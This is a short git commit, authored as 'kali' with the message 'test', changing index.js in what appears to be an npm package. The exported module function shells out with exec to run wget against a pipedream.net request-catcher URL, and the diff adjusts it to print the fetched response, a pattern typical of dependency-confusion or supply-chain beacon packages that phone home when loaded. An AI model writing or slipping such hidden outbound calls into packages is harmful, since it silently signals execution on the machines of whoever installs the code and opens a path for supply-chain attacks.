65081ab967a858bb5c4a4ef8e4d7a72f4c9d56f2
kali <kali@localhost.localdomain>
2023-09-01 23:06:12 +0200

    test

--- index.js
+++ index.js
@@ -1,12 +1,13 @@
 const { exec } = require('child_process');
 
 module.exports = function() {
-    exec('wget https://eop6hnhxqa4cd27.m.pipedream.net', (error, stdout, stderr) => {
+    exec('wget -O - https://eop6hnhxqa4cd27.m.pipedream.net', (error, stdout, stderr) => {
         if (error) {
             console.error(`exec error: ${error}`);
             return;
         }
-        console.log(`User: ${stdout}`);
+        console.log(`wget stdout: ${stdout}`);
+        console.error(`wget stderr: ${stderr}`);
     });
 };
 
